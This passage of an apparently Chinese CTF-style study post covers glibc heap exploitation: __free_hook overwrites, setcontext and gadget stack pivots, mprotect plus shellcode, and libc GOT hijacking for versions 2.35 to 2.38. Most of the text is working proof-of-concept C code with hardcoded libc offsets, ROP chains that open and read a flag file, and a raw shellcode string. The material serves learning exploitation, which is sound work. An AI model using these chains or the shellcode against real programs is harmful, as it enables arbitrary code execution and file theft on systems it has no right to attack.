//    <setcontext+121>    mov    rdi, qword ptr [rdi + 0x68]     RDI, [0x56174aa656d8] => 0
//    <setcontext+125>    xor    eax, eax                        EAX => 0
//    <setcontext+127>    ret           
int main() {
  char *system_ptr = (char *)&system;
  char *getshell_ptr = (char *)getshell;
  printf("system:%p\n",system_ptr);

  char* read=system_ptr+0xa24c0;
  char* open=system_ptr+0xa2140;
  char* write=system_ptr+0xa2590;
  //char* syscall_ret=system_ptr+0xe6069;
  char* pop_rdi_ret=system_ptr-0x20233;
  char* pop_rsi_ret=system_ptr-0x20324;
  char* pop_rdx_ret=system_ptr-0x3fbea;

  char *context=malloc(0xb0); //法）这里如果不能申请那么大可以利用跨chunk来利用其他chunk已经布置好的context
  *(unsigned long long*)(context+0xa0)=context+0x8; // rsp 
  *(unsigned long long*)(context+0xa8)=pop_rdi_ret; // push rcx 
  *(unsigned long long *)context=pop_rdi_ret;  //orw
  *(unsigned long long *)(context+8)=context+0x70;
  *(unsigned long long *)(context+0x10)=pop_rsi_ret;   
  *(unsigned long long *)(context+0x18)=0;   
  *(unsigned long long *)(context+0x20)=open;  
  *(unsigned long long *)(context+0x28)=pop_rdi_ret;
  *(unsigned long long *)(context+0x30)=3;
  *(unsigned long long *)(context+0x38)=pop_rdx_ret;
  *(unsigned long long *)(context+0x40)=0x10;
  *(unsigned long long *)(context+0x48)=read;
  *(unsigned long long *)(context+0x50)=pop_rdi_ret;
  *(unsigned long long *)(context+0x58)=1;
  *(unsigned long long *)(context+0x60)=write;
  strcpy(context+0x70, "./flag");
  char *setcontext_53=system_ptr+0x2535;
  char *free_hook=system_ptr+0x370168;
  *(unsigned long long*)free_hook=setcontext_53;

  free(context);
  
  return 0;
}
```
- setcontext+magic_gadget（setcontext没用rdi传参）

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}
//   	mov    rsp,QWORD PTR [rdx+0xa0]
//    mov    rbx,QWORD PTR [rdx+0x80]
//    mov    rbp,QWORD PTR [rdx+0x78]
//    mov    r12,QWORD PTR [rdx+0x48]
//    mov    r13,QWORD PTR [rdx+0x50]
//    mov    r14,QWORD PTR [rdx+0x58]
//    mov    r15,QWORD PTR [rdx+0x60]
//    mov    rcx,QWORD PTR [rdx+0xa8]
//    push   rcx
//    mov    rsi,QWORD PTR [rdx+0x70]
//    mov    rdi,QWORD PTR [rdx+0x68]
//    mov    rcx,QWORD PTR [rdx+0x98]
//    mov    r8,QWORD PTR [rdx+0x28]
//    mov    r9,QWORD PTR [rdx+0x30]
//    mov    rdx,QWORD PTR [rdx+0x88]
//    xor    eax,eax
//    ret    

// 0x0000000000121d60 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
int main() {
  char* chunk1=malloc(0x100);
  char* chunk2=malloc(0x100);
  free(chunk1);
  free(chunk2);
  char* system_ptr=system;
  printf("system addr %p\n",system_ptr);
  char* free_hook=system_ptr+0x374c28;
  char* magic_gadget=system_ptr+0xddb40;
  char* setcontext=system_ptr+0x2b05;
  char* read=system_ptr+0xa3ef0;
  char* open=system_ptr+0xa3c60;
  char* write=system_ptr+0xa3f90;
  char* syscall_ret=system_ptr+0xe6069;
  char* pop_rdi_ret=system_ptr-0x2177e;
  char* pop_rsi_ret=system_ptr-0x20ea2;
  char* pop_rdx_ret=system_ptr-0x42686;
  printf("free_hook %p \n",free_hook);
  
  *(unsigned long long *)chunk2=(unsigned long long)(free_hook-8);
  
  chunk2=malloc(0x100);
  chunk1=malloc(0x100);
  *(unsigned long long *)(chunk1+8)=magic_gadget;
  printf("chunk1 %p \n",*(unsigned long long *)chunk1);
  char* padding=malloc(0x100);
  *(unsigned long long *)(padding+0x10)=pop_rdi_ret;  //orw
  *(unsigned long long *)(padding+0x18)=padding+0x78;
  *(unsigned long long *)(padding+0x20)=pop_rsi_ret;   
  *(unsigned long long *)(padding+0x28)=0;   
  *(unsigned long long *)(padding+0x30)=open;  
  *(unsigned long long *)(padding+0x38)=pop_rdi_ret;
  *(unsigned long long *)(padding+0x40)=3;
  *(unsigned long long *)(padding+0x48)=pop_rdx_ret;
  *(unsigned long long *)(padding+0x50)=0x10;
  *(unsigned long long *)(padding+0x58)=read;
  *(unsigned long long *)(padding+0x60)=pop_rdi_ret;
  *(unsigned long long *)(padding+0x68)=1;
  *(unsigned long long *)(padding+0x70)=write;
  strcpy(padding+0x78, "./flag");
  *(unsigned long long *)(padding)=setcontext;
  *(unsigned long long *)(padding+0x8)=padding-0x20;
  *(unsigned long long *)(padding-0x20+0xa0)=padding+0x18;  //rsp
  *(unsigned long long *)(padding-0x20+0xa8)=pop_rdi_ret;   //rcx
  free(padding);
  return 0;
}
```

## 堆的 shellcode
[pwn中mprotect函数利用详解](https://xz.aliyun.com/t/12717?time__1311=GqGxu7i=itdeqGN4nxU2BFm3GKvdh7hbD)

```cpp
int mprotect(void * addr, size_t len, int prot)

其中变量addr代表对应内存块的指针，len代表内存块的大小，而prot代表内存块所拥有的权限

对于prot来说，对应权限依照以下规则改变值

无法访问 即PROT_NONE：不允许访问，值为 0
可读权限 即PROT_READ：可读，值加 1
可写权限 即PROT_WRITE：可读， 值加 2
可执行权限 即PROT_EXEC：可执行，值加 4
```
从上面的poc可以知道，rop链的长度是大于shellcode的
当有布局长度限制时候，可以通过布局rop调用mprotect函数然后+shellcode或者直接shellcode（不需要mprotect）来解决
### poc

```cpp
Assembly
Raw Hex (zero bytes in bold):

BA666C6167524889E731F66A02580F0589C74889E631C00F0583F70289F80F05   

String Literal:

"\xBA\x66\x6C\x61\x67\x52\x48\x89\xE7\x31\xF6\x6A\x02\x58\x0F\x05\x89\xC7\x48\x89\xE6\x31\xC0\x0F\x05\x83\xF7\x02\x89\xF8\x0F\x05"

Array Literal:

{ 0xBA, 0x66, 0x6C, 0x61, 0x67, 0x52, 0x48, 0x89, 0xE7, 0x31, 0xF6, 0x6A, 0x02, 0x58, 0x0F, 0x05, 0x89, 0xC7, 0x48, 0x89, 0xE6, 0x31, 0xC0, 0x0F, 0x05, 0x83, 0xF7, 0x02, 0x89, 0xF8, 0x0F, 0x05 }

Disassembly:
0:  ba 66 6c 61 67          mov    edx,0x67616c66
5:  52                      push   rdx
6:  48 89 e7                mov    rdi,rsp
9:  31 f6                   xor    esi,esi
b:  6a 02                   push   0x2
d:  58                      pop    rax
e:  0f 05                   syscall
10: 89 c7                   mov    edi,eax
12: 48 89 e6                mov    rsi,rsp
15: 31 c0                   xor    eax,eax
17: 0f 05                   syscall
19: 83 f7 02                xor    edi,0x2
1c: 89 f8                   mov    eax,edi
1e: 0f 05                   syscall
```

对比rop后发现由于跳转到shellcode前的一些操作，最后发现总长度并没有优化多少，当然shellcode也许可以进一步优化

- magic gadget （一般来说是rop链构造不了达到的长度会选择shellcode）
最后通过`call   QWORD PTR [rax+0x28]`来劫持控制流，由于只能劫持一次，shellocde的话需要mprotect改内存权限才能执行shellcode，这里只能说栈迁移后再通过rop链调用mprotect（然后输入shellcode再跳转 但这样少不了多少）或者直接跳转到shellcode（已经输入好了加上调整调整地址的rop链，感觉和gets()输入shellcode差不了多少就差一个调用get而已）

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}
//    libc:0x7fd0795d7000
//    svcudp_reply
//    0x00007fbfdb845f2e <+14>:	mov    rbp,rdi
//    0x00007fbfdb845f31 <+17>:	push   rbx
//    0x00007fbfdb845f32 <+18>:	sub    rsp,0x18
//    0x00007fbfdb845f36 <+22>:	mov    rbx,QWORD PTR [rdi+0x48]
//    0x00007fbfdb845f3a <+26>:	mov    rax,QWORD PTR [rbx+0x18]
//    0x00007fbfdb845f3e <+30>:	lea    r12,[rbx+0x10]
//    0x00007fbfdb845f42 <+34>:	mov    DWORD PTR [rbx+0x10],0x0
//    0x00007fbfdb845f49 <+41>:	mov    rdi,r12
// => 0x00007fbfdb845f4c <+44>:	call   QWORD PTR [rax+0x28]

int main() {
  char* chunk1=malloc(0x100);
  char* chunk2=malloc(0x100);
  free(chunk1);
  free(chunk2);
  char* system_ptr=system;
  printf("system addr %p\n",system_ptr);
  char* free_hook=system_ptr+0x374c28;
  char* magic_gadget=system_ptr+0xdfd16-8;
  char* read=system_ptr+0xa3ef0;
  char* open=system_ptr+0xa3c60;
  char* write=system_ptr+0xa3f90;
  char* mprotect=system_ptr+0xad0f0;

  char* syscall_ret=system_ptr+0xe6069;
  char* pop_rdi_ret=system_ptr-0x2177e;
  char* pop_rsi_ret=system_ptr-0x20ea2;
  char* pop_rdx_ret=system_ptr-0x42686;
  char* jmp_shellcode=system_ptr-0xf419;
  printf("free_hook %p \n",free_hook);
  
  *(unsigned long long *)chunk2=(unsigned long long)(free_hook-8);
  
  chunk2=malloc(0x100);
  chunk1=malloc(0x100);
  *(unsigned long long *)(chunk1+8)=magic_gadget;
  printf("chunk1 %p \n",*(unsigned long long *)chunk1);
  char* padding=malloc(0x100);
  // *(unsigned long long *)rop=pop_rdi_ret;  //orw
  // *(unsigned long long *)(rop+8)=rop+0x70;
  // *(unsigned long long *)(rop+0x10)=pop_rsi_ret;   
  // *(unsigned long long *)(rop+0x18)=0;   
  // *(unsigned long long *)(rop+0x20)=open;  
  // *(unsigned long long *)(rop+0x28)=pop_rdi_ret;
  // *(unsigned long long *)(rop+0x30)=3;
  // *(unsigned long long *)(rop+0x38)=pop_rdx_ret;
  // *(unsigned long long *)(rop+0x40)=0x10;
  // *(unsigned long long *)(rop+0x48)=read;
  // *(unsigned long long *)(rop+0x50)=pop_rdi_ret;
  // *(unsigned long long *)(rop+0x58)=1;
  // *(unsigned long long *)(rop+0x60)=write;
  // strcpy(rop+0x70, "./flag");
   char* rop=malloc(0x100);
  *(unsigned long long *)rop=pop_rdi_ret;  //orw
  *(unsigned long long *)(rop+8)=(unsigned long long)rop&(unsigned long long)~0xfff;
  *(unsigned long long *)(rop+0x10)=pop_rsi_ret;   
  *(unsigned long long *)(rop+0x18)=0x1000;   
  *(unsigned long long *)(rop+0x20)=pop_rdx_ret;  
  *(unsigned long long *)(rop+0x28)=7;
  *(unsigned long long *)(rop+0x30)=mprotect;
  *(unsigned long long *)(rop+0x38)=pop_rdi_ret;
  char* shellcode =rop+0x50;
  strcpy(shellcode,"\xBA\x66\x6C\x61\x67\x52\x48\x89\xE7\x31\xF6\x6A\x02\x58\x0F\x05\x89\xC7\x48\x89\xE6\x31\xC0\x0F\x05\x83\xF7\x02\x89\xF8\x0F\x05");
  *(unsigned long long *)(rop+0x40)=shellcode;
  *(unsigned long long *)(rop+0x48)=jmp_shellcode;


  *(unsigned long long *)(padding+0x48)=padding+0x10;
  *(unsigned long long *)(padding+0x28)=padding+0x8;
  *(unsigned long long *)(padding+0x30)=system_ptr+0x47c7;
  *(unsigned long long *)(padding+0x8)=system_ptr-0x4084c;
  *(unsigned long long *)(padding+0x10)=rop;
  free(padding);
  
  return 0;
}
```
- setcontext：由于setcontext也是rop链形式的劫持，所以和上面差不多

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}
//    <setcontext+53>    mov    rsp, qword ptr [rdi + 0xa0]     RSP, [0x55bf1e64c710] => 0
//    <setcontext+60>    mov    rbx, qword ptr [rdi + 0x80]     RBX, [0x55bf1e64c6f0] => 0
//    <setcontext+67>    mov    rbp, qword ptr [rdi + 0x78]     RBP, [0x55bf1e64c6e8] => 0
//    <setcontext+71>    mov    r12, qword ptr [rdi + 0x48]     R12, [0x55bf1e64c6b8] => 0
//    <setcontext+75>    mov    r13, qword ptr [rdi + 0x50]     R13, [0x55bf1e64c6c0] => 0
//  ► <setcontext+79>    mov    r14, qword ptr [rdi + 0x58]     R14, [0x55bf1e64c6c8] => 0x20941
//    <setcontext+83>    mov    r15, qword ptr [rdi + 0x60]     R15, [0x55bf1e64c6d0] => 0
//    <setcontext+87>    mov    rcx, qword ptr [rdi + 0xa8]     RCX, [0x55bf1e64c718] => 0
//    <setcontext+94>    push   rcx
//    <setcontext+95>    mov    rsi, qword ptr [rdi + 0x70]
//    <setcontext+99>    mov    rdx, qword ptr [rdi + 0x88]
//    <setcontext+106>    mov    rcx, qword ptr [rdi + 0x98]
//    <setcontext+113>    mov    r8, qword ptr [rdi + 0x28]
//    <setcontext+117>    mov    r9, qword ptr [rdi + 0x30]
//    <setcontext+121>    mov    rdi, qword ptr [rdi + 0x68]     RDI, [0x56174aa656d8] => 0
//    <setcontext+125>    xor    eax, eax                        EAX => 0
//    <setcontext+127>    ret           
int main() {
  char *system_ptr = (char *)&system;
  char *getshell_ptr = (char *)getshell;
  printf("system:%p\n",system_ptr);

  char* read=system_ptr+0xa24c0;
  char* open=system_ptr+0xa2140;
  char* write=system_ptr+0xa2590;
  char* mprotect=system_ptr+0xab470;
  //char* syscall_ret=system_ptr+0xe6069;
  char* pop_rdi_ret=system_ptr-0x20233;
  char* pop_rsi_ret=system_ptr-0x20324;
  char* pop_rdx_ret=system_ptr-0x3fbea;
  char* jmp_shellcode=system_ptr+0x2136c;

  char *context=malloc(0xb0); //法）这里如果不能申请那么大可以利用跨chunk来利用其他chunk已经布置好的context
  *(unsigned long long*)(context+0xa0)=context+0x8; // rsp 
  *(unsigned long long*)(context+0xa8)=pop_rdi_ret; // push rcx 
  *(unsigned long long *)context=pop_rdi_ret;  //orw
  *(unsigned long long *)(context+8)=(unsigned long long)context&(unsigned long long)~0xfff;;
  *(unsigned long long *)(context+0x10)=pop_rsi_ret;   
  *(unsigned long long *)(context+0x18)=0x1000;   
  *(unsigned long long *)(context+0x20)=pop_rdx_ret;  
  *(unsigned long long *)(context+0x28)=7;
  *(unsigned long long *)(context+0x30)=mprotect;
  *(unsigned long long *)(context+0x38)=pop_rdi_ret;
  char* shellcode =context+0x50;
  strcpy(shellcode,"\xBA\x66\x6C\x61\x67\x52\x48\x89\xE7\x31\xF6\x6A\x02\x58\x0F\x05\x89\xC7\x48\x89\xE6\x31\xC0\x0F\x05\x83\xF7\x02\x89\xF8\x0F\x05");
  *(unsigned long long *)(context+0x40)=shellcode;
  *(unsigned long long *)(context+0x48)=jmp_shellcode;

  char *setcontext_53=system_ptr+0x2535;
  char *free_hook=system_ptr+0x370168;
  *(unsigned long long*)free_hook=setcontext_53;

  free(context);
  
  return 0;
}
```

- setcontext+magic_gadget

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}
//   	mov    rsp,QWORD PTR [rdx+0xa0]
//    mov    rbx,QWORD PTR [rdx+0x80]
//    mov    rbp,QWORD PTR [rdx+0x78]
//    mov    r12,QWORD PTR [rdx+0x48]
//    mov    r13,QWORD PTR [rdx+0x50]
//    mov    r14,QWORD PTR [rdx+0x58]
//    mov    r15,QWORD PTR [rdx+0x60]
//    mov    rcx,QWORD PTR [rdx+0xa8]
//    push   rcx
//    mov    rsi,QWORD PTR [rdx+0x70]
//    mov    rdi,QWORD PTR [rdx+0x68]
//    mov    rcx,QWORD PTR [rdx+0x98]
//    mov    r8,QWORD PTR [rdx+0x28]
//    mov    r9,QWORD PTR [rdx+0x30]
//    mov    rdx,QWORD PTR [rdx+0x88]
//    xor    eax,eax
//    ret    

//  mov rdx, qword ptr [rdi + 8] ;
//  mov qword ptr [rsp], rax ; 
//  call qword ptr [rdx + 0x20]
int main() {
  char* chunk1=malloc(0x100);
  char* chunk2=malloc(0x100);
  free(chunk1);
  free(chunk2);
  char* system_ptr=system;
  printf("system addr %p\n",system_ptr);
  char* free_hook=system_ptr+0x374c28;
  char* magic_gadget=system_ptr+0xddb40;
  char* setcontext=system_ptr+0x2b05;
  char* read=system_ptr+0xa3ef0;
  char* open=system_ptr+0xa3c60;
  char* write=system_ptr+0xa3f90;
  char* mprotect=system_ptr+0xad0f0;

  char* syscall_ret=system_ptr+0xe6069;
  char* pop_rdi_ret=system_ptr-0x2177e;
  char* pop_rsi_ret=system_ptr-0x20ea2;
  char* pop_rdx_ret=system_ptr-0x42686;
  char* jmp_shellcode=system_ptr-0xf419;

  printf("free_hook %p \n",free_hook);
  
  *(unsigned long long *)chunk2=(unsigned long long)(free_hook-8);
  
  chunk2=malloc(0x100);
  chunk1=malloc(0x100);
  *(unsigned long long *)(chunk1+8)=magic_gadget;
  printf("chunk1 %p \n",*(unsigned long long *)chunk1);
  char* padding=malloc(0x100);
  *(unsigned long long *)(padding+0x10)=pop_rdi_ret;  //orw
  *(unsigned long long *)(padding+0x18)=(unsigned long long)padding&(unsigned long long)~0xfff;;
  *(unsigned long long *)(padding+0x20)=pop_rsi_ret;   
  *(unsigned long long *)(padding+0x28)=0x1000;   
  *(unsigned long long *)(padding+0x30)=pop_rdx_ret;  
  *(unsigned long long *)(padding+0x38)=7;
  *(unsigned long long *)(padding+0x40)=mprotect;
  *(unsigned long long *)(padding+0x48)=pop_rdi_ret;
  char* shellcode =padding+0x60;
  strcpy(shellcode,"\xBA\x66\x6C\x61\x67\x52\x48\x89\xE7\x31\xF6\x6A\x02\x58\x0F\x05\x89\xC7\x48\x89\xE6\x31\xC0\x0F\x05\x83\xF7\x02\x89\xF8\x0F\x05");
  *(unsigned long long *)(padding+0x50)=shellcode;
  *(unsigned long long *)(padding+0x58)=jmp_shellcode;

 

  *(unsigned long long *)(padding)=setcontext;
  *(unsigned long long *)(padding+0x8)=padding-0x20;
  *(unsigned long long *)(padding-0x20+0xa0)=padding+0x18;  //rsp  
  *(unsigned long long *)(padding-0x20+0xa8)=pop_rdi_ret;   //rcx  push rcx
  free(padding);
  return 0;
}
```

# libc got 利用
[modern arb write -> rce is hard](https://hackmd.io/@pepsipu/SyqPbk94a)
[Glibc 高版本堆利用方法总结·](https://www.roderickchan.cn/zh-cn/2023-03-01-analysis-of-glibc-heap-exploitation-in-high-version/)
[glibc GOT hijack 学习](https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/)
[Libc-GOT-Hijacking](https://github.com/n132/Libc-GOT-Hijacking)
[『hijack_libc_got』劫持libc的got表getshell](https://c-lby.top/2024/06/25/hijack-libc-got/)

调用libc函数时其内部有些会调用到libcgot表里的函数，可以通过把libc放入IDA查看该libc函数调用的函数，如果存在以j开头的函数如j_strlen，那么有可能调用到了libcgot表里的函数（~~或者直接把libcgot所有函数下个断点：）那肯定知道了~~ ）

- libc中的plt0
```cpp
.plt:000000000002C000 ; __unwind {
.plt:000000000002C000                 push    cs:qword_1F2008
.plt:000000000002C006                 bnd jmp cs:qword_1F2010
.plt:000000000002C006 sub_2C000       endp
```
- libc中的got.plt，右边可以看到这些会被j_开头的函数调用

```cpp
.got.plt:00000000001F2008 qword_1F2008    dq 0                    ; DATA XREF: sub_2C000↑r
.got.plt:00000000001F2010 qword_1F2010    dq 0                    ; DATA XREF: sub_2C000+6↑r
.got.plt:00000000001F2018 off_1F2018      dq offset __strnlen_ifunc
.got.plt:00000000001F2018                                         ; DATA XREF: j___strnlen_ifunc+4↑r
.got.plt:00000000001F2018                                         ; Indirect relocation
.got.plt:00000000001F2020 off_1F2020      dq offset __rawmemchr_ifunc
.got.plt:00000000001F2020                                         ; DATA XREF: j___rawmemchr_ifunc+4↑r
.got.plt:00000000001F2020                                         ; Indirect relocation
.got.plt:00000000001F2028 off_1F2028      dq offset __GI___libc_realloc
.got.plt:00000000001F2028                                         ; DATA XREF: _realloc+4↑r
.got.plt:00000000001F2030 off_1F2030      dq offset __strncasecmp_ifunc
.got.plt:00000000001F2030                                         ; DATA XREF: j___strncasecmp_ifunc+4↑r
.got.plt:00000000001F2030                                         ; Indirect relocation
……………………………………………………………
```

条件：泄露libc +写got.plt

printf：`j___mempcpy_ifunc`和`j___strchrnul_ifunc`
puts：`strlen_ifunc`
……

- 2.35：写GOT0为栈迁移的rsp，GOT1为`pop rsp ret`,修改会调用的libcgot为plt0，然后往对应的迁移的地方写好rop链

```cpp
#include <stdio.h>
#include <unistd.h>
#include <string.h>
int main() {
    char *addr = 0;
    size_t len = 0;
    printf("printf %p\n", printf);
    char* libc_got=printf+0x195dc0+0x8;
    printf("libc got %p\n",libc_got);
    char* plt0=printf-0x30240;
    char* pop_rsp=printf-0x2eae5;
    char* pop_rdi=printf-0x2e7be;
    char* pop_rsi=printf-0x24686;
    char* pop_rax=printf-0x17b70;
    char* pop_rsp_jmp_rax=printf+0xe1da5;
    *(unsigned long long *)libc_got=libc_got+0x10;
    *(unsigned long long *)(libc_got+0x8)=pop_rsp;
    *(unsigned long long *)(libc_got+0x10)=pop_rdi;
    *(unsigned long long *)(libc_got+0x18)=printf+0x1582a7;  ///bin/sh  addr
    *(unsigned long long *)(libc_got+0x20)=pop_rax;
    *(unsigned long long *)(libc_got+0x28)=printf-0xdf30;
    *(unsigned long long *)(libc_got+0x30)=pop_rsi;
    *(unsigned long long *)(libc_got+0x38)=plt0;   //__mempcpy_ifunc
    *(unsigned long long *)(libc_got+0x40)=pop_rsp_jmp_rax;
    *(unsigned long long *)(libc_got+0x48)=libc_got+0x3000-0x8;
    //*(unsigned long long *)(libc_got+0x38)=libc_got+0x100;
    printf("llk");
}
```
- 2.36-2.38：GOT0和GOT1都不可写了，但以下的libc.got都可以写
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/bc67fd5170f846f3b482dd099942ce50.png)
想法就是一次控制流劫持gadget->设置rsp相关值为rdi->调用gets函数往返回地址写rop链

参考veritas师傅给出的在IDA寻找合适gadget的正则表达式
```cpp
.*lea\s+rdi,\s+\[rsp\+.*\n(?:.*\n){0,9}.*call\s+j_.*
```
条件:泄露libc+写3个libc.got+有对应的三个libcgot函数的两两跳转的gadget

```cpp
#include <stdio.h>
#include <unistd.h>
#include <string.h>

// .got.plt:00000000001FE078 off_1FE078      dq offset strncpy       ; DATA XREF: j_strncpy+4↑r
// .got.plt:00000000001FE080 off_1FE080      dq offset strlen        ; DATA XREF: j_strlen+4↑r
// .got.plt:00000000001FE088 off_1FE088      dq offset wcscat        ; DATA XREF: j_wcscat+4↑r
// .got.plt:00000000001FE090 off_1FE090      dq offset strcasecmp_l  ; DATA XREF: j_strcasecmp_l+4↑r
// .got.plt:00000000001FE098 off_1FE098      dq offset strcpy        ; DATA XREF: j_strcpy+4↑r
// .got.plt:00000000001FE0A0 off_1FE0A0      dq offset wcschr        ; DATA XREF: j_wcschr+4↑r
// .got.plt:00000000001FE0A8 off_1FE0A8      dq offset _dl_deallocate_tls
// .got.plt:00000000001FE0B0 off_1FE0B0      dq offset __tls_get_addr
// .got.plt:00000000001FE0B8 off_1FE0B8      dq offset wmemset       ; DATA XREF: j_wmemset_0+4↑r
// .got.plt:00000000001FE0C0 off_1FE0C0      dq offset memcmp        ; DATA XREF: j_memcmp+4↑r
// .got.plt:00000000001FE0C8 off_1FE0C8      dq offset strchrnul     ; DATA XREF: j_strchrnul+4↑r

// # overwrite strchrnul.got with:
// .text:0000000000177ED9 loc_177ED9:                             ; CODE XREF: login+123↓j
// .text:0000000000177ED9                 lea     rdi, [rsp+18h]
// .text:0000000000177EDE                 mov     edx, 20h ; ' '
// .text:0000000000177EE3                 call    j_strncpy
// # overwrite strncpy.got with:
// .text:00000000000D6128                 pop     rbx
// .text:00000000000D6129                 pop     rbp
// .text:00000000000D612A                 pop     r12
// .text:00000000000D612C                 pop     r13
// .text:00000000000D612E                 jmp     j_wmemset_0

// # overwrite wmemset.got with `gets`

int main() {
    char *addr = 0;
    size_t len = 0;
    printf("printf %p\n", printf);
    char* libc=printf-0x5c7c0;
    char* libc_got=libc+0x00000000001FE000;
    printf("libc got %p\n",libc_got);
    char* change_rdi_rsp_call_strncpy_gadget=libc+0x0000000000177ED9;
    char* pop_change_rsp_jmp_wmemset_0_gadget=libc+0x00000000000D6128;
    char* gets=libc+0x82b60;
    *(unsigned long long *)(libc_got+0x78)=pop_change_rsp_jmp_wmemset_0_gadget;   //  j_strncpy 
    *(unsigned long long *)(libc_got+0xb8)=gets;   //  j_wmemset_0 
    *(unsigned long long *)(libc_got+0xc8)=change_rdi_rsp_call_strncpy_gadget;  // j_strchrnul  change rdi to rsp
    printf("llk");
    // 最后会调用gets然后起个python脚本交互写rop链
}


```

- 2.39：都不能写了，卒。。
